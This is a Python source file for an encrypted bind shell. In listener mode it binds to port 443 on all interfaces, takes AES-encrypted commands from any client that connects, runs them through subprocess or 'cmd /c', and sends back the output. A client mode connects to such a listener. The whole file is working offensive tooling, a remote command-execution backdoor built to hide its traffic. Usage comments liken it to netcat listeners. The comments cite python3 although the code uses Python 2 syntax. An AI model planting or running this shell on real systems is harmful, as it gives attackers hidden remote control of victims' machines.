import sys
import time
import socket
import argparse
import platform
import threading
import subprocess

from aes import AES

class BindShell:
    def __init__(self):
        self.aes = AES()

    def encrypted_send(self, s, message):
        """Send an AES-encrypted message."""

        encrypted = self.aes.encrypt(message)
        s.send(encrypted)

    def execute_cmd(self, cmd):
        """Execute a Linux/Windows command."""

        if platform.system() == 'Linux':
            try:
                output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT)
            except:
                output = 'Command failed.'
        elif platform.system() == 'Windows':
            try:
                output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
            except:
                output = 'Command failed.'
        else:
            print 'The system must be Linux or Windows. Terminating...'
            sys.exit()
        
        return output

    def cleanup(self, s):
        """Close the socket and exit the program."""
        s.close()
        sys.exit()

    def shell_thread(self, s):
        """Multithreading interactive shell sesion."""
        if platform.system() == 'Linux':
            self.encrypted_send(s, "[ -- Connected -- ]\n")
        elif platform.system() == 'Windows':
            self.encrypted_send(s, "[ -- Connected -- ]\r\n")
        else:
            print 'The system must be Linux or Windows. Terminating...'
            sys.exit()

        try:
            while True:
                if platform.system() == 'Linux':
                    self.encrypted_send(s, "\nEnter command>")
                elif platform.system() == 'Windows':
                    self.encrypted_send(s, "\r\nEnter command>")
                else:
                    print 'The system must be Linux or Windows. Terminating...'
                    sys.exit()

                data = s.recv(4096)

                if data:
                    decrypted = self.aes.decrypt(data.strip())

                    if not decrypted or decrypted.strip() == 'exit':
                        self.cleanup(s)

                    print "> Executing command: '{}'".format(decrypted)
                    command_result = self.execute_cmd(decrypted)
                    self.encrypted_send(s, command_result)
        except:
            print 'shell_thread error. Terminating...'
            self.cleanup(s)

    def send_thread(self, s):
        """Multithreading send()."""
        try:
            while True:
                input_data = raw_input() + '\n'
                self.encrypted_send(s, input_data)
        except:
            print 'send_thread error. Terminating...'
            self.cleanup(s)

    def recv_thread(self, s):
        """Multithreading recv()."""
        try:
            while True:
                data = s.recv(4096)

                if data:
                    decrypted = self.aes.decrypt(data.strip())
                    print decrypted
                else:
                    break
        except:
            print 'recv_thread error. Terminating...'
            self.cleanup(s)

    def server(self):
        """Socket server."""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('0.0.0.0', 443))
        s.listen(5)

        print '[ -- Starting Bind Shell -- ]'
        while True:
            client_socket, addr = s.accept()
            print '[ -- New User Connected -- ]'
            threading.Thread(target=self.shell_thread, args=(client_socket,)).start()

    def client(self, ip):
        """Socket client."""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 443))

        print '[ -- Connecting to Bind Shell -- ]'
        threading.Thread(target=self.send_thread, args=(s,)).start()
        threading.Thread(target=self.recv_thread, args=(s,)).start()

    def run(self):
        parser = argparse.ArgumentParser()

        # Usage: python3 bind_shell.py -l
        # This is similar to nc -nvlp 1337
        parser.add_argument(
            '-l',
            '--listen',
            action='store_true',
            help='Setup a bind shell',
            required=False,
        )
        # Usage: python3 bind_shell.py -c 127.0.0.1
        # This is similar to nc 127.0.0.1 1337 with a random key
        parser.add_argument(
            '-c',
            '--connect',
            help='Connect to a bind shell',
            required=False,
        )

        args = parser.parse_args()

        if args.listen:
            self.server()
        elif args.connect:
            self.client(args.connect)

if __name__ == '__main__':
    bind_shell = BindShell()
    bind_shell.run()
